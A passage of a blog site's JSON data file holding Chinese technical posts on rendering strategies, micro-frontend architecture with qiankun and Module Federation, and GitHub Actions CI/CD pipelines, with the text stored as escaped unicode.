SSR \u9875\u9762\\n// app/dashboard/page.tsx\\nexport const dynamic = \'force-dynamic\';\\n\\nexport default async function Dashboard() {\\n  const data = await fetchUserData();\\n  return <Dashboard data={data} />;\\n}\\n\\n// ISR \u9875\u9762\\n// app/products/page.tsx\\nasync function getProducts() {\\n  const res = await fetch(\'...\', {\\n    next: { revalidate: 3600 },\\n  });\\n  return res.json();\\n}\\n\\n// \u5ba2\u6237\u7aef\u7ec4\u4ef6\\n\'use client\';\\nexport default function InteractiveWidget() {\\n  const [count, setCount] = useState(0);\\n  return <button onClick={() => setCount(c => c + 1)}>{count}</button>;\\n}\\n```\\n\\n---\\n\\n## \ud83c\udfaf \u9009\u62e9\u6307\u5357\\n\\n```markdown\\n1. \u9700\u8981 SEO \u5417\uff1f\\n   - \u4e0d\u9700\u8981 \u2192 CSR\\n   - \u9700\u8981 \u2192 \u7ee7\u7eed\\n\\n2. \u6570\u636e\u66f4\u65b0\u9891\u7387\uff1f\\n   - \u5f88\u5c11\u66f4\u65b0 \u2192 SSG\\n   - \u5b9a\u671f\u66f4\u65b0 \u2192 ISR\\n   - \u5b9e\u65f6\u66f4\u65b0 \u2192 SSR\\n\\n3. \u662f\u5426\u4e2a\u6027\u5316\u5185\u5bb9\uff1f\\n   - \u662f \u2192 SSR\\n   - \u5426 \u2192 SSG / ISR\\n```\\n\\n---\\n\\n## \ud83d\udccb \u6846\u67b6\u652f\u6301\\n\\n| \u6846\u67b6 | CSR | SSR | SSG | ISR |\\n|------|-----|-----|-----|-----|\\n| Next.js | \u2705 | \u2705 | \u2705 | \u2705 |\\n| Nuxt.js | \u2705 | \u2705 | \u2705 | \u2705 |\\n| Astro | \u2705 | \u2705 | \u2705 | \u2705 |\\n| Gatsby | \u2705 | - | \u2705 | - |\\n| React | \u2705 | - | - | - |\\n\\n---\\n\\n\u6ca1\u6709\u6700\u597d\u7684\u7b56\u7565\uff0c\u53ea\u6709\u6700\u9002\u5408\u7684\u7b56\u7565\u3002\u6839\u636e\u9875\u9762\u7279\u70b9\u9009\u62e9\u5408\u9002\u7684\u6e32\u67d3\u65b9\u5f0f\u3002"},{"id":"micro-frontend","metadata":{"permalink":"/blog/micro-frontend","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-12-15-micro-frontend.md","source":"@site/blog/2024-12-15-micro-frontend.md","title":"\u5fae\u524d\u7aef\u67b6\u6784\u8bbe\u8ba1\u6307\u5357","description":"\u5fae\u524d\u7aef\u662f\u4e00\u79cd\u5c06\u524d\u7aef\u5e94\u7528\u62c6\u5206\u4e3a\u72ec\u7acb\u90e8\u7f72\u5355\u5143\u7684\u67b6\u6784\u6a21\u5f0f\u3002\u672c\u6587\u4ecb\u7ecd\u5fae\u524d\u7aef\u7684\u6838\u5fc3\u6982\u5ff5\u548c\u5b9e\u73b0\u65b9\u6848\u3002","date":"2024-12-15T00:00:00.000Z","tags":[{"inline":true,"label":"\u5fae\u524d\u7aef","permalink":"/blog/tags/\u5fae\u524d\u7aef"},{"inline":true,"label":"\u67b6\u6784","permalink":"/blog/tags/\u67b6\u6784"},{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"}],"readingTime":4.12,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"micro-frontend","title":"\u5fae\u524d\u7aef\u67b6\u6784\u8bbe\u8ba1\u6307\u5357","authors":"mason","tags":["\u5fae\u524d\u7aef","\u67b6\u6784","\u524d\u7aef"]},"unlisted":false,"prevItem":{"title":"SSR vs SSG vs ISR \u6e32\u67d3\u7b56\u7565\u5bf9\u6bd4","permalink":"/blog/ssr-ssg-isr"},"nextItem":{"title":"CI/CD \u6d41\u6c34\u7ebf\u642d\u5efa\u6307\u5357","permalink":"/blog/cicd-pipeline"}},"content":"\u5fae\u524d\u7aef\u662f\u4e00\u79cd\u5c06\u524d\u7aef\u5e94\u7528\u62c6\u5206\u4e3a\u72ec\u7acb\u90e8\u7f72\u5355\u5143\u7684\u67b6\u6784\u6a21\u5f0f\u3002\u672c\u6587\u4ecb\u7ecd\u5fae\u524d\u7aef\u7684\u6838\u5fc3\u6982\u5ff5\u548c\u5b9e\u73b0\u65b9\u6848\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4ec0\u4e48\u662f\u5fae\u524d\u7aef\\n\\n```markdown\\n\u5fae\u524d\u7aef = \u5fae\u670d\u52a1\u7406\u5ff5 + \u524d\u7aef\u5e94\u7528\\n\\n\u6838\u5fc3\u601d\u60f3\uff1a\\n- \u5c06\u5927\u578b\u5e94\u7528\u62c6\u5206\u4e3a\u5c0f\u578b\u3001\u72ec\u7acb\u7684\u5e94\u7528\\n- \u6bcf\u4e2a\u5e94\u7528\u53ef\u4ee5\u72ec\u7acb\u5f00\u53d1\u3001\u6d4b\u8bd5\u3001\u90e8\u7f72\\n- \u5e94\u7528\u4e4b\u95f4\u677e\u8026\u5408\\n```\\n\\n### \u9002\u7528\u573a\u666f\\n\\n| \u573a\u666f | \u8bf4\u660e |\\n|------|------|\\n| \u5927\u578b\u4f01\u4e1a\u5e94\u7528 | \u591a\u56e2\u961f\u534f\u4f5c |\\n| \u9057\u7559\u7cfb\u7edf\u6539\u9020 | \u6e10\u8fdb\u5f0f\u91cd\u6784 |\\n| \u6280\u672f\u6808\u8fc1\u79fb | \u65b0\u65e7\u5e76\u5b58 |\\n| \u591a\u4ea7\u54c1\u6574\u5408 | \u7edf\u4e00\u95e8\u6237 |\\n\\n### \u4e0d\u9002\u7528\u573a\u666f\\n\\n```markdown\\n- \u5c0f\u578b\u9879\u76ee\\n- \u56e2\u961f\u89c4\u6a21\u5c0f\\n- \u6027\u80fd\u8981\u6c42\u6781\u9ad8\\n- \u6ca1\u6709\u660e\u786e\u7684\u4e1a\u52a1\u8fb9\u754c\\n```\\n\\n---\\n\\n## \ud83c\udfd7\ufe0f \u4e3b\u6d41\u65b9\u6848\\n\\n| \u65b9\u6848 | \u539f\u7406 | \u4f18\u70b9 | \u7f3a\u70b9 |\\n|------|------|------|------|\\n| **qiankun** | \u57fa\u4e8e single-spa | \u6210\u719f\u7a33\u5b9a | \u6709\u4fb5\u5165\u6027 |\\n| **Module Federation** | Webpack 5 | \u5171\u4eab\u4f9d\u8d56 | \u8026\u5408 Webpack |\\n| **iframe** | \u539f\u751f\u9694\u79bb | \u9694\u79bb\u6027\u597d | \u901a\u4fe1\u590d\u6742 |\\n| **Web Components** | \u6807\u51c6\u7ec4\u4ef6 | \u6846\u67b6\u65e0\u5173 | \u6d4f\u89c8\u5668\u517c\u5bb9 |\\n\\n---\\n\\n## \ud83d\udce6 qiankun \u5b9e\u6218\\n\\n### \u4e3b\u5e94\u7528\\n\\n```bash\\nnpm install qiankun\\n```\\n\\n```tsx\\n// main-app/src/main.tsx\\nimport { registerMicroApps, start } from \'qiankun\';\\n\\nregisterMicroApps([\\n  {\\n    name: \'react-app\',\\n    entry: \'//localhost:3001\',\\n    container: \'#subapp-container\',\\n    activeRule: \'/react\',\\n    props: {\\n      user: { name: \'admin\' },\\n    },\\n  },\\n  {\\n    name: \'vue-app\',\\n    entry: \'//localhost:3002\',\\n    container: \'#subapp-container\',\\n    activeRule: \'/vue\',\\n  },\\n]);\\n\\nstart({\\n  sandbox: {\\n    experimentalStyleIsolation: true,\\n  },\\n});\\n```\\n\\n```tsx\\n// main-app/src/App.tsx\\nfunction App() {\\n  return (\\n    <div>\\n      <nav>\\n        <Link to=\\"/react\\">React App</Link>\\n        <Link to=\\"/vue\\">Vue App</Link>\\n      </nav>\\n      <div id=\\"subapp-container\\"></div>\\n    </div>\\n  );\\n}\\n```\\n\\n### \u5b50\u5e94\u7528 (React)\\n\\n```tsx\\n// react-app/src/main.tsx\\nimport { createRoot } from \'react-dom/client\';\\nimport App from \'./App\';\\n\\nlet root: ReturnType<typeof createRoot> | null = null;\\n\\n// \u72ec\u7acb\u8fd0\u884c\\nif (!(window as any).__POWERED_BY_QIANKUN__) {\\n  root = createRoot(document.getElementById(\'root\')!);\\n  root.render(<App />);\\n}\\n\\n// \u751f\u547d\u5468\u671f\\nexport async function bootstrap() {\\n  console.log(\'react app bootstrap\');\\n}\\n\\nexport async function mount(props: any) {\\n  console.log(\'react app mount\', props);\\n  const container = props.container?.querySelector(\'#root\') || document.getElementById(\'root\');\\n  root = createRoot(container!);\\n  root.render(<App {...props} />);\\n}\\n\\nexport async function unmount() {\\n  console.log(\'react app unmount\');\\n  root?.unmount();\\n}\\n```\\n\\n```javascript\\n// react-app/vite.config.ts\\nimport { defineConfig } from \'vite\';\\nimport react from \'@vitejs/plugin-react\';\\nimport qiankun from \'vite-plugin-qiankun\';\\n\\nexport default defineConfig({\\n  plugins: [\\n    react(),\\n    qiankun(\'react-app\', { useDevMode: true }),\\n  ],\\n  server: {\\n    port: 3001,\\n    cors: true,\\n    origin: \'http://localhost:3001\',\\n  },\\n});\\n```\\n\\n---\\n\\n## \ud83d\udd17 Module Federation\\n\\n### \u4e3b\u5e94\u7528\u914d\u7f6e\\n\\n```javascript\\n// webpack.config.js\\nconst { ModuleFederationPlugin } = require(\'webpack\').container;\\n\\nmodule.exports = {\\n  plugins: [\\n    new ModuleFederationPlugin({\\n      name: \'host\',\\n      remotes: {\\n        remoteApp: \'remoteApp@http://localhost:3001/remoteEntry.js\',\\n      },\\n      shared: {\\n        react: { singleton: true },\\n        \'react-dom\': { singleton: true },\\n      },\\n    }),\\n  ],\\n};\\n```\\n\\n### \u8fdc\u7a0b\u5e94\u7528\u914d\u7f6e\\n\\n```javascript\\n// webpack.config.js\\nconst { ModuleFederationPlugin } = require(\'webpack\').container;\\n\\nmodule.exports = {\\n  plugins: [\\n    new ModuleFederationPlugin({\\n      name: \'remoteApp\',\\n      filename: \'remoteEntry.js\',\\n      exposes: {\\n        \'./Button\': \'./src/components/Button\',\\n        \'./UserList\': \'./src/components/UserList\',\\n      },\\n      shared: {\\n        react: { singleton: true },\\n        \'react-dom\': { singleton: true },\\n      },\\n    }),\\n  ],\\n};\\n```\\n\\n### \u4f7f\u7528\u8fdc\u7a0b\u7ec4\u4ef6\\n\\n```tsx\\n// host/src/App.tsx\\nimport React, { lazy, Suspense } from \'react\';\\n\\nconst RemoteButton = lazy(() => import(\'remoteApp/Button\'));\\nconst RemoteUserList = lazy(() => import(\'remoteApp/UserList\'));\\n\\nfunction App() {\\n  return (\\n    <Suspense fallback=\\"Loading...\\">\\n      <RemoteButton />\\n      <RemoteUserList />\\n    </Suspense>\\n  );\\n}\\n```\\n\\n---\\n\\n## \ud83d\udd12 \u6837\u5f0f\u9694\u79bb\\n\\n### CSS Modules\\n\\n```tsx\\n// \u5b50\u5e94\u7528\u4f7f\u7528 CSS Modules\\nimport styles from \'./App.module.css\';\\n\\nfunction App() {\\n  return <div className={styles.container}>...</div>;\\n}\\n```\\n\\n### Shadow DOM\\n\\n```tsx\\n// \u4f7f\u7528 Shadow DOM \u9694\u79bb\\nconst container = document.getElementById(\'app\');\\nconst shadow = container.attachShadow({ mode: \'open\' });\\nshadow.innerHTML = `\\n  <style>\\n    .btn { color: red; }\\n  </style>\\n  <button class=\\"btn\\">Click</button>\\n`;\\n```\\n\\n### qiankun \u6837\u5f0f\u9694\u79bb\\n\\n```tsx\\nstart({\\n  sandbox: {\\n    strictStyleIsolation: true, // Shadow DOM\\n    // \u6216\\n    experimentalStyleIsolation: true, // \u6dfb\u52a0\u524d\u7f00\\n  },\\n});\\n```\\n\\n---\\n\\n## \ud83d\udce1 \u5e94\u7528\u901a\u4fe1\\n\\n### Props \u4f20\u9012\\n\\n```tsx\\n// \u4e3b\u5e94\u7528\\nregisterMicroApps([\\n  {\\n    name: \'sub-app\',\\n    entry: \'//localhost:3001\',\\n    container: \'#container\',\\n    activeRule: \'/sub\',\\n    props: {\\n      user: currentUser,\\n      onLogout: handleLogout,\\n    },\\n  },\\n]);\\n\\n// \u5b50\u5e94\u7528\\nexport async function mount(props) {\\n  console.log(props.user);\\n  props.onLogout();\\n}\\n```\\n\\n### \u5168\u5c40\u72b6\u6001\\n\\n```tsx\\n// \u4e3b\u5e94\u7528\\nimport { initGlobalState } from \'qiankun\';\\n\\nconst actions = initGlobalState({\\n  user: null,\\n  theme: \'light\',\\n});\\n\\nactions.onGlobalStateChange((state, prev) => {\\n  console.log(\'state changed\', state, prev);\\n});\\n\\nactions.setGlobalState({ user: { name: \'admin\' } });\\n\\n// \u5b50\u5e94\u7528\\nexport async function mount(props) {\\n  props.onGlobalStateChange((state) => {\\n    console.log(\'global state\', state);\\n  });\\n  \\n  props.setGlobalState({ theme: \'dark\' });\\n}\\n```\\n\\n### \u81ea\u5b9a\u4e49\u4e8b\u4ef6\\n\\n```tsx\\n// \u53d1\u9001\\nwindow.dispatchEvent(new CustomEvent(\'micro-app-event\', {\\n  detail: { type: \'LOGIN\', payload: user },\\n}));\\n\\n// \u63a5\u6536\\nwindow.addEventListener(\'micro-app-event\', (e) => {\\n  console.log(e.detail);\\n});\\n```\\n\\n---\\n\\n## \ud83d\udcc2 \u516c\u5171\u4f9d\u8d56\\n\\n### \u5916\u90e8\u5316\\n\\n```javascript\\n// \u5b50\u5e94\u7528 webpack.config.js\\nmodule.exports = {\\n  externals: {\\n    react: \'React\',\\n    \'react-dom\': \'ReactDOM\',\\n  },\\n};\\n\\n// \u4e3b\u5e94\u7528\u52a0\u8f7d\u516c\u5171\u4f9d\u8d56\\n<script src=\\"https://cdn.example.com/react.min.js\\"><\/script>\\n<script src=\\"https://cdn.example.com/react-dom.min.js\\"><\/script>\\n```\\n\\n### \u5171\u4eab\u7ec4\u4ef6\u5e93\\n\\n```tsx\\n// packages/shared-ui\\nexport { Button } from \'./Button\';\\nexport { Modal } from \'./Modal\';\\n\\n// \u5b50\u5e94\u7528\u4f7f\u7528\\nimport { Button } from \'@company/shared-ui\';\\n```\\n\\n---\\n\\n## \ud83d\udee0\ufe0f \u5f00\u53d1\u8c03\u8bd5\\n\\n### \u672c\u5730\u5f00\u53d1\\n\\n```javascript\\n// \u4e3b\u5e94\u7528\u5224\u65ad\u73af\u5883\\nconst apps = [\\n  {\\n    name: \'sub-app\',\\n    entry: process.env.NODE_ENV === \'development\'\\n      ? \'//localhost:3001\'\\n      : \'//cdn.example.com/sub-app/\',\\n    container: \'#container\',\\n    activeRule: \'/sub\',\\n  },\\n];\\n```\\n\\n### \u72ec\u7acb\u8c03\u8bd5\\n\\n```javascript\\n// \u5b50\u5e94\u7528\u72ec\u7acb\u8fd0\u884c\\nif (!(window as any).__POWERED_BY_QIANKUN__) {\\n  render();\\n}\\n```\\n\\n---\\n\\n## \ud83d\udccb \u6700\u4f73\u5b9e\u8df5\\n\\n```markdown\\n1. \u660e\u786e\u5e94\u7528\u8fb9\u754c\\n   - \u6309\u4e1a\u52a1\u57df\u62c6\u5206\\n   - \u907f\u514d\u8fc7\u5ea6\u62c6\u5206\\n\\n2. \u7edf\u4e00\u6280\u672f\u89c4\u8303\\n   - \u4ee3\u7801\u89c4\u8303\\n   - \u63a5\u53e3\u89c4\u8303\\n   - \u90e8\u7f72\u89c4\u8303\\n\\n3. \u516c\u5171\u8d44\u6e90\u7ba1\u7406\\n   - \u5171\u4eab\u7ec4\u4ef6\u5e93\\n   - \u516c\u5171\u4f9d\u8d56\\n   - \u5168\u5c40\u6837\u5f0f\\n\\n4. \u6027\u80fd\u4f18\u5316\\n   - \u9884\u52a0\u8f7d\\n   - \u8d44\u6e90\u590d\u7528\\n   - \u6309\u9700\u52a0\u8f7d\\n\\n5. \u76d1\u63a7\u548c\u8c03\u8bd5\\n   - \u9519\u8bef\u76d1\u63a7\\n   - \u6027\u80fd\u76d1\u63a7\\n   - \u65e5\u5fd7\u805a\u5408\\n```\\n\\n---\\n\\n## \ud83d\udcca \u67b6\u6784\u5bf9\u6bd4\\n\\n| \u7ef4\u5ea6 | \u5355\u4f53\u5e94\u7528 | \u5fae\u524d\u7aef |\\n|------|---------|--------|\\n| \u56e2\u961f\u534f\u4f5c | \u56f0\u96be | \u5bb9\u6613 |\\n| \u6280\u672f\u6808 | \u7edf\u4e00 | \u7075\u6d3b |\\n| \u90e8\u7f72 | \u6574\u4f53 | \u72ec\u7acb |\\n| \u6027\u80fd | \u8f83\u597d | \u9700\u4f18\u5316 |\\n| \u590d\u6742\u5ea6 | \u4f4e | \u9ad8 |\\n\\n---\\n\\n\u5fae\u524d\u7aef\u4e0d\u662f\u94f6\u5f39\u3002\u5728\u51b3\u5b9a\u91c7\u7528\u524d\uff0c\u8bf7\u786e\u4fdd\u5b83\u80fd\u89e3\u51b3\u4f60\u7684\u5b9e\u9645\u95ee\u9898\u3002"},{"id":"cicd-pipeline","metadata":{"permalink":"/blog/cicd-pipeline","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-12-01-cicd.md","source":"@site/blog/2024-12-01-cicd.md","title":"CI/CD \u6d41\u6c34\u7ebf\u642d\u5efa\u6307\u5357","description":"CI/CD \u662f\u73b0\u4ee3\u8f6f\u4ef6\u5f00\u53d1\u7684\u57fa\u77f3\u3002\u672c\u6587\u4ecb\u7ecd\u5982\u4f55\u4f7f\u7528 GitHub Actions \u642d\u5efa\u81ea\u52a8\u5316\u6d41\u6c34\u7ebf\u3002","date":"2024-12-01T00:00:00.000Z","tags":[{"inline":true,"label":"CI/CD","permalink":"/blog/tags/ci-cd"},{"inline":true,"label":"DevOps","permalink":"/blog/tags/dev-ops"},{"inline":true,"label":"GitHub Actions","permalink":"/blog/tags/git-hub-actions"}],"readingTime":4.44,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"cicd-pipeline","title":"CI/CD \u6d41\u6c34\u7ebf\u642d\u5efa\u6307\u5357","authors":"mason","tags":["CI/CD","DevOps","GitHub Actions"]},"unlisted":false,"prevItem":{"title":"\u5fae\u524d\u7aef\u67b6\u6784\u8bbe\u8ba1\u6307\u5357","permalink":"/blog/micro-frontend"},"nextItem":{"title":"Tailwind CSS \u5b9e\u8df5\u6280\u5de7","permalink":"/blog/tailwindcss-practice"}},"content":"CI/CD \u662f\u73b0\u4ee3\u8f6f\u4ef6\u5f00\u53d1\u7684\u57fa\u77f3\u3002\u672c\u6587\u4ecb\u7ecd\u5982\u4f55\u4f7f\u7528 GitHub Actions \u642d\u5efa\u81ea\u52a8\u5316\u6d41\u6c34\u7ebf\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4ec0\u4e48\u662f CI/CD\\n\\n| \u6982\u5ff5 | \u5168\u79f0 | \u542b\u4e49 |\\n|------|------|------|\\n| CI | Continuous Integration | \u6301\u7eed\u96c6\u6210\uff1a\u81ea\u52a8\u6d4b\u8bd5\u3001\u6784\u5efa |\\n| CD | Continuous Delivery | \u6301\u7eed\u4ea4\u4ed8\uff1a\u81ea\u52a8\u90e8\u7f72\u5230\u9884\u53d1\u73af\u5883 |\\n| CD | Continuous Deployment | \u6301\u7eed\u90e8\u7f72\uff1a\u81ea\u52a8\u90e8\u7f72\u5230\u751f\u4ea7\u73af\u5883 |\\n\\n### \u5178\u578b\u6d41\u7a0b\\n\\n```\\n\u4ee3\u7801\u63d0\u4ea4 \u2192 \u81ea\u52a8\u6d4b\u8bd5 \u2192 \u4ee3\u7801\u68c0\u67e5 \u2192 \u6784\u5efa \u2192 \u90e8\u7f72\\n```\\n\\n---\\n\\n## \ud83d\ude80 GitHub Actions \u57fa\u7840\\n\\n### \u5de5\u4f5c\u6d41\u6587\u4ef6\\n\\n```yaml\\n# .github/workflows/ci.yml\\nname: CI\\n\\non:\\n  push:\\n    branches: [main, develop]\\n  pull_request:\\n    branches: [main]\\n\\njobs:\\n  test:\\n    runs-on: ubuntu-latest\\n    \\n    steps:\\n      - name: Checkout code\\n        uses: actions/checkout@v4\\n\\n      - name: Setup Node.js\\n        uses: actions/setup-node@v4\\n        with:\\n          node-version: \'20\'\\n          cache: \'npm\'\\n\\n      - name: Install dependencies\\n        run: npm ci\\n\\n      - name: Run tests\\n        run: npm test\\n\\n      - name: Run lint\\n        run: npm run lint\\n```\\n\\n### \u6838\u5fc3\u6982\u5ff5\\n\\n| \u6982\u5ff5 | \u8bf4\u660e |\\n|------|------|\\n| Workflow | \u5de5\u4f5c\u6d41\uff0c\u5b9a\u4e49\u81ea\u52a8\u5316\u6d41\u7a0b |\\n| Event | \u89e6\u53d1\u4e8b\u4ef6\uff08push, PR, schedule\uff09 |\\n| Job | \u4efb\u52a1\uff0c\u53ef\u5e76\u884c\u6267\u884c |\\n| Step | \u6b65\u9aa4\uff0c\u6309\u987a\u5e8f\u6267\u884c |\\n| Action | \u53ef\u590d\u7528\u7684\u64cd\u4f5c\u5355\u5143 |\\n| Runner | \u6267\u884c\u73af\u5883 |\\n\\n---\\n\\n## \ud83d\udccb \u5e38\u7528\u89e6\u53d1\u5668\\n\\n```yaml\\non:\\n  # \u63a8\u9001\u89e6\u53d1\\n  push:\\n    branches: [main]\\n    paths:\\n      - \'src/**\'\\n      - \'package.json\'\\n    paths-ignore:\\n      - \'**.md\'\\n      - \'docs/**\'\\n\\n  # PR \u89e6\u53d1\\n  pull_request:\\n    branches: [main]\\n    types: [opened, synchronize, reopened]\\n\\n  # \u5b9a\u65f6\u89e6\u53d1\\n  schedule:\\n    - cron: \'0 2 * * *\'  # \u6bcf\u5929\u51cc\u6668 2 \u70b9\\n\\n  # \u624b\u52a8\u89e6\u53d1\\n  workflow_dispatch:\\n    inputs:\\n      environment:\\n        description: \'Deploy environment\'\\n        required: true\\n        default: \'staging\'\\n        type: choice\\n        options:\\n          - staging\\n          - production\\n\\n  # \u5176\u4ed6\u5de5\u4f5c\u6d41\u89e6\u53d1\\n  workflow_call:\\n```\\n\\n---\\n\\n## \ud83d\udd27 \u5b8c\u6574 CI \u6d41\u6c34\u7ebf\\n\\n```yaml\\nname: CI Pipeline\\n\\non:\\n  push:\\n    branches: [main, develop]\\n  pull_request:\\n    branches: [main]\\n\\nenv:\\n  NODE_VERSION: \'20\'\\n\\njobs:\\n  # \u4ee3\u7801\u8d28\u91cf\u68c0\u67e5\\n  lint:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - uses: actions/checkout@v4\\n      \\n      - uses: actions/setup-node@v4\\n        with:\\n          node-version: ${{ env.NODE_VERSION }}\\n          cache: \'npm\'\\n      \\n      - run: npm ci\\n      - run: npm run lint\\n      - run: npm run type-check\\n\\n  # \u5355\u5143\u6d4b\u8bd5\\n  test:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - uses: actions/checkout@v4\\n      \\n      - uses: actions/setup-node@v4\\n        with:\\n          node-version: ${{ env.NODE_VERSION }}\\n          cache: \'npm\'\\n      \\n      - run: npm ci\\n      - run: npm test -- --coverage\\n      \\n      - name: Upload coverage\\n        uses: codecov/codecov-action@v3\\n        with:\\n          token: ${{ secrets.CODECOV_TOKEN }}\\n\\n  # \u6784\u5efa\\n  build:\\n    runs-on: ubuntu-latest\\n    needs: [lint, test]  # \u4f9d\u8d56\u524d\u9762\u7684\u4efb\u52a1\\n    steps:\\n      - uses: actions/checkout@v4\\n      \\n      - uses: actions/setup-node@v4\\n        with:\\n          node-version: ${{ env.NODE_VERSION }}\\n          cache: \'npm\'\\n      \\n      - run: npm ci\\n      - run: npm run build\\n      \\n      - name: Upload build artifacts\\n        uses: actions/upload-artifact@v4\\n        with:\\n          name: build\\n          path: dist/\\n          retention-days: 7\\n\\n  # E2E \u6d4b\u8bd5\\n  e2e:\\n    runs-on: ubuntu-latest\\n    needs: build\\n    steps:\\n      - uses: actions/checkout@v4\\n      \\n      - uses: actions/setup-node@v4\\n        with:\\n          node-version: ${{ env.NODE_VERSION }}\\n          cache: \'npm\'\\n      \\n      - run: npm ci\\n      \\n      - name: Download build\\n        uses: actions/download-artifact@v4\\n        with:\\n          name: build\\n          path: dist/\\n      \\n      - name: Run E2E tests\\n        run: npm run test:e2e\\n```\\n\\n---\\n\\n## \ud83d\udea2 \u90e8\u7f72\u6d41\u6c34\u7ebf\\n\\n### \u90e8\u7f72\u5230 Vercel\\n\\n```yaml\\nname: Deploy to Vercel\\n\\non:\\n  push:\\n    branches: [main]\\n\\njobs:\\n  deploy:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - uses: actions/checkout@v4\\n\\n      - name: Deploy to Vercel\\n        uses: amondnet/vercel-action@v25\\n        with:\\n          vercel-token: ${{ secrets.VERCEL_TOKEN }}\\n          vercel-org-id: ${{ secrets.VERCEL_ORG_ID }}\\n          vercel-project-id: ${{ secrets.VERCEL_PROJECT_ID }}\\n          vercel-args: \'--prod\'\\n```\\n\\n### \u90e8\u7f72\u5230\u670d\u52a1\u5668\\n\\n```yaml\\nname: Deploy to Server\\n\\non:\\n  push:\\n    branches: [main]\\n\\njobs:\\n  deploy:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - uses: actions/checkout@v4\\n\\n      - name: Setup Node.js\\n        uses: actions/setup-node@v4\\n        with:\\n          node-version: \'20\'\\n          cache: \'npm\'\\n\\n      - run: npm ci\\n      - run: npm run build\\n\\n      - name: Deploy via SSH\\n        uses: appleboy/ssh-action@v1.0.0\\n        with:\\n          host: ${{ secrets.SERVER_HOST }}\\n          username: ${{ secrets.SERVER_USER }}\\n          key: ${{ secrets.SSH_PRIVATE_KEY }}\\n          script: |\\n            cd /var/www/app\\n            git pull origin main\\n            npm ci --production\\n            npm run build\\n            pm2 restart app\\n```\\n\\n### Docker \u90e8\u7f72\\n\\n```yaml\\nname: Docker Build and Deploy\\n\\non:\\n  push:\\n    branches: [main]\\n\\njobs:\\n  build-and-push:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - uses: actions/checkout@v4\\n\\n      - name: Login to Docker Hub\\n        uses: docker/login-action@v3\\n        with:\\n          username: ${{ secrets.DOCKER_USERNAME }}\\n          password: ${{ secrets.DOCKER_PASSWORD }}\\n\\n      - name: Build and push\\n        uses: docker/build-push-action@v5\\n        with:\\n          context: .\\n          push: true\\n          tags: |\\n            username/app:latest\\n            username/app:${{ github.sha }}\\n\\n      - name: Deploy to server\\n        uses: appleboy/ssh-action@v1.0.0\\n        with:\\n          host: ${{ secrets.SERVER_HOST }}\\n          username: ${{ secrets.SERVER_USER }}\\n          key: ${{ secrets.SSH_PRIVATE_KEY }}\\n          script: |\\n            docker pull username/app:latest\\n            docker stop app || true\\n            docker rm app || true\\n            docker run -d --name app -p 3000:3000 username/app:latest\\n```\\n\\n---\\n\\n## \ud83d\udd10 Secrets \u7ba1\u7406\\n\\n### \u8bbe\u7f6e Secrets\\n\\n```markdown\\n1. \u4ed3\u5e93 Settings \u2192 Secrets and variables \u2192 Actions\\n2. New repository secret\\n3. \u6dfb\u52a0\u654f\u611f\u4fe1\u606f\\n```\\n\\n### \u4f7f\u7528 Secrets\\n\\n```yaml\\nenv:\\n  API_KEY: ${{ secrets.API_KEY }}\\n\\nsteps:\\n  - name: Deploy\\n    run: ./deploy.sh\\n    env:\\n      SERVER_PASSWORD: ${{ secrets.SERVER_PASSWORD }}\\n```\\n\\n### \u73af\u5883 Secrets\\n\\n```yaml\\njobs:\\n  deploy:\\n    runs-on: ubuntu-latest\\n    environment: production  # \u4f7f\u7528 production \u73af\u5883\u7684 secrets\\n    steps:\\n      - run: echo ${{ secrets.PROD_API_KEY }}\\n```\\n\\n---\\n\\n## \ud83d\udcca Matrix \u7b56\u7565\\n\\n```yaml\\njobs:\\n  test:\\n    runs-on: ${{ matrix.os }}\\n    strategy:\\n      matrix:\\n        os: [ubuntu-latest, windows-latest, macos-latest]\\n        node: [18, 20, 22]\\n        exclude:\\n          - os: windows-latest\\n            node: 18\\n    steps:\\n      - uses: actions/checkout@v4\\n      - uses: actions/setup-node@v4\\n        with:\\n          node-version: ${{ matrix.node }}\\n      - run: npm ci\\n      - run: npm test\\n```\\n\\n---\\n\\n## \ud83d\udcbe \u7f13\u5b58\u4f18\u5316\\n\\n```yaml\\nsteps:\\n  - uses: actions/checkout@v4\\n\\n  - uses: actions/setup-node@v4\\n    with:\\n      node-version: \'20\'\\n      cache: \'npm\'  # \u81ea\u52a8\u7f13\u5b58\\n\\n  # \u6216\u8005\u624b\u52a8\u7f13\u5b58\\n  - name: Cache node_modules\\n    uses: actions/cache@v4\\n    with:\\n      path: node_modules\\n      key: ${{ runner.os }}-node-${{ hashFiles(\'package-lock.json\') }}\\n      restore-keys: |\\n        ${{ runner.os }}-node-\\n```\\n\\n---\\n\\n## \ud83d\udccb \u6700\u4f73\u5b9e\u8df5\\n\\n```markdown\\n1. \u4fdd\u6301\u6d41\u6c34\u7ebf\u5feb\u901f\uff08< 10 \u5206\u949f\uff09\\n2. \u5e76\u884c\u6267\u884c\u72ec\u7acb\u4efb\u52a1\\n3. \u4f7f\u7528\u7f13\u5b58\u52a0\u901f\u6784\u5efa\\n4. \u53ea\u5728\u5fc5\u8981\u65f6\u89e6\u53d1\\n5. \u5408\u7406\u4f7f\u7528 Secrets\\n6. \u6dfb\u52a0\u8d85\u65f6\u9650\u5236\\n7. \u901a\u77e5\u6784\u5efa\u7ed3\u679c\\n```\\n\\n### \u901a\u77e5\\n\\n```yaml\\n- name: Notify on failure\\n  if: failure()\\n  uses: 8398a7/action-slack@v3\\n  with:\\n    status: ${{ job.status }}\\n    channel: \'#deployments\'\\n  env:\\n    